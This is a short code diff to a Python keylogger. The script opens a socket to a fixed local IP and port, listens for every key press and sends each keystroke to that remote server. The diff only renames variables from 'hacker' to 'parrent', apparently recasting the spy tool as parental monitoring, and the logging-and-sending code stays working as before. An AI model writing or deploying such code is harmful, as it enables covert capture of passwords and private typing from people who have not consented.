@@ -3,9 +3,9 @@ import socket
 
 clientSocket = socket.socket( socket.AF_INET, socket.SOCK_STREAM)
 
-serverHacker = '192.168.1.22'
+serverParrent = '192.168.1.22'
 serverPort = 12345
-clientSocket.connect((serverHacker, serverPort))
+clientSocket.connect((serverParrent, serverPort))
 print (clientSocket.recv(1024).decode())
 
 def on_press(key):
@@ -16,6 +16,5 @@ def on_press(key):
     clientSocket.send(key.encode('utf-8')) #mã hóa key thành dạng byte
 
 
-with  Listener(on_press =  on_press) as hacker:         
-    hacker.join()
-
+with  Listener(on_press =  on_press) as parrent:         
+    parrent.join()
